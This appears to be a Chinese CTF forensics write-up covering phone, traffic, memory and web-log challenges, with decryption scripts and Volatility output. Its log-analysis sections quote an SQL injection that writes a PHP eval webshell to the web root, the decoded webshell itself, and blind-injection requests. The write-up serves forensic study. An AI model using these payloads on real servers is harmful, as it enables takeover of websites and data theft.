# 2025-01-20 题解

## [2022蓝帽杯]手机取证1

https://www.nssctf.cn/problem/2443

- 信息检索、取证工具
- 工具：盘古石阅读器

1. 打开盘古石阅读器，搜索对应图片
2. 对照题目 Flag 规则描述，得到 Flag：300×300

## [2023陇剑杯]Wireshark1_1

https://www.nssctf.cn/problem/6359

- 考点：流量分析
- 工具：wireshark

1. 使用wireshark打开流量包

   - 方法一：点击`统计>IPv4 statistics>All Addresses`发现此流量包中只涉及三个IP，IP数量较少，可以挨个提交，得到flag：192.168.246.28

   - 方法二：`右键>追踪流>TCP Stream`，可以发现是`192.168.246.1`在向`192.168.246.28`请求，故flag：192.168.246.28

## [2022蓝帽杯]网站取证_2

 https://www.nssctf.cn/problem/2452

- 考点：PHP，AES
- 工具：在线PHP，在线AES解密，cyberchef

1. 打开网站源码，在`application`文件夹中找到`config.php`文件，该文件中很有可能配置了数据库连接密码，打开文件进行审计，发现数据库密码调用了encrypt.php中`my_encrypt`函数，该函数是对一个给定的加密字符串进行解密。

   - 方法一：直接输出返回值，使用[php在线工具](https://onlinephp.io/)，因为`mcrypt`库在PHP7.1标记为过时，在PHP7.2就将其移除，所以选择的PHP版本在7.1之前，在末尾增加输出语句

     ```php
     <?php
     function my_encrypt(){
         $str = 'P3LMJ4uCbkFJ/RarywrCvA==';
         $str = str_replace(array("/r/n", "/r", "/n"), "", $str);
         $key = 'PanGuShi';
         $iv = substr(sha1($key),0,16);
         $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,"",MCRYPT_MODE_CBC,"");
         mcrypt_generic_init($td, "PanGuShi", $iv);
         $decode = base64_decode($str);
         $dencrypted = mdecrypt_generic($td, $decode);
         mcrypt_generic_deinit($td);
         mcrypt_module_close($td);
         $dencrypted = trim($dencrypted);
         return $dencrypted;
     }
     
     echo my_encrypt();
     ```

     得到结果flag：KBLT123

   - 方法二：如果没有`PHP`环境的话，可以使用`python`实现，使用`pycryptodome`库的`AES`模块进行解密，使用前需要先安装`pycryptodome`库：
  
     ```bash
     pip install pycryptodome
     ```

     ```python
     from Crypto.Cipher import AES
     from Crypto.Hash import SHA1
     from Crypto.Util.Padding import unpad
     import base64
     
     def my_decrypt():
         # 加密后的字符串
         encrypted_str = 'P3LMJ4uCbkFJ/RarywrCvA=='
         # 密钥
         key = b'PanGuShi'
         
         # 使用空字节填充密钥到16字节
         padded_key = key.ljust(16, b'\0')
         
         iv=b'130f028b5c4b9e1b'
         
         # base64解码
         encrypted_data = base64.b64decode(encrypted_str)
         
         # 创建AES解密器 (CBC模式)
         cipher = AES.new(padded_key, AES.MODE_CBC, iv)
         
         # 解密
         decrypted_data = cipher.decrypt(encrypted_data)
         
         # 去除填充
         try:
             decrypted_text = unpad(decrypted_data, AES.block_size)
         except ValueError as e:
             print("解密后的数据填充不正确:", e)
             return None
         
         ascii_output = ''.join(chr(b) for b in decrypted_text)
         
         return ascii_output
     
     if __name__ == '__main__':
         print(my_decrypt())
     
     ```
   
     ```bash
     (datacon) PS C:\Users\22487\Desktop> python .\aes.py
     KBLT123
     ```
   
     得到flag为KBLT123
   
   - 方法三：密钥为`PanGuShi`，对密钥进行 `SHA-1` 哈希，哈希值的前 16 个字符作为初始化向量，使用`cyberchef`得到初始向量为`130f028b5c4b9e1b`，由于密钥长度不够16 字节需要使用空字符进行填充，在`cyberchef`中密钥支持使用`base64`和`hex`格式
   
     ```bash
     (base) ubuntu@MyROG:~$ echo -ne "PanGuShi\x00\x00\x00\x00\x00\x00\x00\x00" | base64
     UGFuR3VTaGkAAAAAAAAAAA==
     ```
   
     或者
   
     ```bash
     (base) ubuntu@MyROG:~$ echo -ne "PanGuShi\x00\x00\x00\x00\x00\x00\x00\x00" | xxd -p
     50616e47755368690000000000000000
     ```
   
     先用`base64`对加密字符串进行解码，再使用`aes`进行解码，即
   
     https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Base64','string':'UGFuR3VTaGkAAAAAAAAAAA%3D%3D'%7D,%7B'option':'UTF8','string':'130f028b5c4b9e1b'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=UDNMTUo0dUNia0ZKL1Jhcnl3ckN2QT09
     或者
   
     https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Hex','string':'50616e47755368690000000000000000'%7D,%7B'option':'UTF8','string':'130f028b5c4b9e1b'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=UDNMTUo0dUNia0ZKL1Jhcnl3ckN2QT09
   
     得到flag为KBLT123

## [OtterCTF 2018]General Info

https://www.nssctf.cn/problem/2459

- 考点：Windows内存取证
- 工具：volatility

1. volatility是一个开源工具，直接[下载](https://github.com/volatilityfoundation/volatility/releases)即可，先获取内存文件的profile

   ```bash
   (base) PS C:\software\CTFtools\volatility_2.6_win64_standalone> .\volatility_2.6_win64_standalone.exe -f C:\Users\22487\Desktop\20250120检材\OtterCTF.vmem imageinfo
   Volatility Foundation Volatility Framework 2.6
   INFO    : volatility.debug    : Determining profile based on KDBG search...
             Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                        AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                        AS Layer2 : FileAddressSpace (C:\Users\22487\Desktop\20250120检材\OtterCTF.vmem)
                         PAE type : No PAE
                              DTB : 0x187000L
                             KDBG : 0xf80002c430a0L
             Number of Processors : 2
        Image Type (Service Pack) : 1
                   KPCR for CPU 0 : 0xfffff80002c44d00L
                   KPCR for CPU 1 : 0xfffff880009ef000L
                KUSER_SHARED_DATA : 0xfffff78000000000L
              Image date and time : 2018-08-04 19:34:22 UTC+0000
        Image local date and time : 2018-08-04 22:34:22 +0300
   ```

2. 获取当前系统的主机名

   ```bash
   (base) PS C:\software\CTFtools\volatility_2.6_win64_standalone> .\volatility_2.6_win64_standalone.exe -f C:\Users\22487\Desktop\20250120检材\OtterCTF.vmem --profile=Win7SP1x64 printkey -K "ControlSet001\Control\ComputerName\ComputerName"
   Volatility Foundation Volatility Framework 2.6
   Legend: (S) = Stable   (V) = Volatile
   
   ----------------------------
   Registry: \REGISTRY\MACHINE\SYSTEM
   Key name: ComputerName (S)
   Last updated: 2018-06-02 19:23:00 UTC+0000
   
   Subkeys:
   
   Values:
   REG_SZ                        : (S) mnmsrvc
   REG_SZ        ComputerName    : (S) WIN-LO6FAF3DTFE
   ```

3. 获取当前内存主机IP地址

   ```bash
   (base) PS C:\software\CTFtools\volatility_2.6_win64_standalone> .\volatility_2.6_win64_standalone.exe -f C:\Users\22487\Desktop\20250120检材\OtterCTF.vmem --profile=Win7SP1x64 netscan
   Volatility Foundation Volatility Framework 2.6
   Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner
    Created
   0x7d60f010         UDPv4    0.0.0.0:1900                   *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+0000
   0x7d62b3f0         UDPv4    192.168.202.131:6771           *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:22 UTC+0000
   0x7d62f4c0         UDPv4    127.0.0.1:62307                *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+0000
   0x7d62f920         UDPv4    192.168.202.131:62306          *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+0000
   0x7d6424c0         UDPv4    0.0.0.0:50762                  *:*                                   4076     chrome.exe     2018-08-04 19:33:37 UTC+0000
   0x7d6b4250         UDPv6    ::1:1900                       *:*                                   164      svchost.exe    2018-08-04 19:28:42 UTC+0000
   0x7d6e3230         UDPv4    127.0.0.1:6771                 *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:22 UTC+0000
   0x7d6ed650         UDPv4    0.0.0.0:5355                   *:*                                   620      svchost.exe    2018-08-04 19:34:22 UTC+0000
   0x7d71c8a0         UDPv4    0.0.0.0:0                      *:*                                   868      svchost.exe    2018-08-04 19:34:22 UTC+0000
   0x7d71c8a0         UDPv6    :::0                           *:*                                   868      svchost.exe    2018-08-04 19:34:22 UTC+0000
   0x7d74a390         UDPv4    127.0.0.1:52847                *:*                                   2624     bittorrentie.e 2018-08-04 19:27:24 UTC+0000
   ```

4. 根据题目信息获得flag为NSSCTF{WIN-LO6FAF3DTFE-192.168.202.131}

## [应急响应]welog1

https://forensics.didctf.com/challenges#welog1-703

- 考点：webshell，PHP一句话木马，Hex
- 工具：cyberchef

1. 打开日志发现前面好像在sql注入，发现一条奇怪的日志信息

   ```
   192.168.150.1 - - [10/Mar/2023:08:19:46 +0000] "GET /index.php?id=0%27%20union%20select%201,0x223c3f70687020406576616c28245f504f53545b273362393064373564653234386365353562363665386533303837336236303030275d293b3f3e22,3,4%20into%20outfile%20%22/var/www/html/ShEll1.php%22; HTTP/1.1" 200 1194 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
   ```

   - Ask GPT：请你帮我解释一下上面日志的含义

     - `GET`：请求方法，表示客户端请求访问服务器上的某个资源。

     - `/index.php?id=0%27%20union%20select%201,...`：请求的  URL。该 URL 包含一个 SQL 注入攻击的参数。
       - `id=0%27%20union%20select%201,...`：`id` 参数包含 SQL 注入的内容。`%27` 是 URL 编码后的单引号（'），`%20` 是空格的编码。这个注入尝试通过 SQL `union` 操作来执行恶意查询。
       - 通过 `union select`，攻击者试图执行一个 SQL 查询来提取数据库中的内容。查询包括了一个长字符串（可能是用来创建 Web shell 的代码）。
       - `into outfile "/var/www/html/ShEll1.php"`：这部分表明攻击者试图将结果写入到服务器的 `/var/www/html/ShEll1.php` 文件中，这个文件看起来是一个 Web shell，攻击者可以用它来远程控制服务器。

   也就是说这条日志的含义就是将这一串16进制的字符串写入`/var/www/html/ShEll1.php`文件当中

2. 使用cyberchef将其转化为可打印字符

   ```
   "<?php @eval($_POST['3b90d75de248ce55b66e8e30873b6000']);?>"
   ```

   是PHP一句话木马，按照题目要求，POST的参数即为flag，flag{3b90d75de248ce55b66e8e30873b6000}

## [陇剑杯 2021]SQL注入

https://www.nssctf.cn/problem/295

- 考点：SQL注入，盲注

1. 通过分析发现这是盲注的日志，先注数据库名，再注表名，然后注列名，最后注flag

2. 首先我们只关注注flag的过程，本来想依据返回值大小来判断，注成功的返回包是要比失败的返回包大一点，但是他们本身没有什么规律，不像布尔盲注这种规律性很强，于是我们可以换位思考，从攻击者的视角来刨析

   - 首先盲注是一个循环，循环的开始都是一样的字符
   - 其次为了节省时间，攻击者一般都是在注入成功之后都会结束该轮循环，也就是说注入成功的字符的下一个字符一定都是最开始的那个字符

   Ask GPT：172.17.0.1 - - [01/Sep/2021:01:37:25 +0000] "GET /index.php?id=1%20and%20if(substr(database(),2,1)%20=%20's',1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1" 200 416 "-" "python-requests/2.26.0" 172.17.0.1 - - [01/Sep/2021:01:37:25 +0000] "GET /index.php?id=1%20and%20if(substr(database(),2,1)%20=%20'r',1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1" 200 416 "-" "python-requests/2.26.0" 172.17.0.1 - - [01/Sep/2021:01:37:25 +0000] "GET /index.php?id=1%20and%20if(substr(database(),2,1)%20=%20'q',1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1" 200 473 "-" "python-requests/2.26.0" 172.17.0.1 - - [01/Sep/2021:01:37:25 +0000] "GET /index.php?id=1%20and%20if(substr(database(),3,1)%20=%20'%C2%80',1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1" 200 421 "-" "python-requests/2.26.0" 172.17.0.1 - - [01/Sep/2021:01:37:25 +0000] "GET /index.php?id=1%20and%20if(substr(database(),3,1)%20=%20'%7F',1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1" 200 418 "-" "python-requests/2.26.0" 上面是一个txt文件中的一部分内容，这是sql注入中盲注的日志，我需要你提取出注入字符为%C2%80的上一条日志注入的字符，请你使用python实现，读取文件中的内容，并实现上面的功能。

   Ask GPT：def extract_injection_characters(log_file):    # 打开并读取日志文件    with open(log_file, 'r') as file:        lines = file.readlines() 请你帮我提取出包含select%20flag%20from%20sqli.flag的行，放在lines里面

   Ask GPT：1%20and%20if(substr((select%20flag%20from%20sqli.flag),1,1)%20=%20'f',1,(select%20table_name%20from%20information_schema.tables)) 我要提取的是%20'f',1,这部分中的f，你帮我重新写一下正则
   ```python
   import re
   import urllib.parse
   
   def extract_injection_characters(log_file):
       # 打开并读取日志文件
       with open(log_file, 'r') as file:
           lines = file.readlines()
       
       # 过滤出包含 "select%20flag%20from%20sqli.flag" 的行
       filtered_lines = [line for line in lines if "select%20flag%20from%20sqli.flag" in line]
   
       # 用于匹配注入字符 %20'f',1, 中的字符
       inject_char_pattern = re.compile(r"%20'([^']+)',1,")
   
       # 存储所有提取的字符
       extracted_chars = []
   
       # 遍历过滤后的日志行
       for i in range(1, len(filtered_lines)):
           current_line = filtered_lines[i]
   
           # 检查当前行是否包含注入字符 %C2%80
           if "%C2%80" in current_line:
               # 如果包含，提取前一行的注入字符
               previous_line = filtered_lines[i - 1]
               match = inject_char_pattern.search(previous_line)
               if match:
                   injected_char = match.group(1)
   
                   # 判断是否需要进行 URL 解码
                   if "%" in injected_char:
                       # 对注入的字符进行 URL 解码
                       injected_char = urllib.parse.unquote(injected_char)
   
                   extracted_chars.append(injected_char)
   
       # 输出所有提取的字符，放在一行
       print(''.join(extracted_chars))
   
   # 使用日志文件路径调用函数
   extract_injection_characters('./access.log')
   ```

   ```bash
   (base) PS C:\Users\22487\Desktop\20250120检材> python .\sql.py
   flag{deddcd67-bcfd-487e-b940-1217e668c7db}
   ```

   最终提取到flag为，flag{deddcd67-bcfd-487e-b940-1217e668c7db}
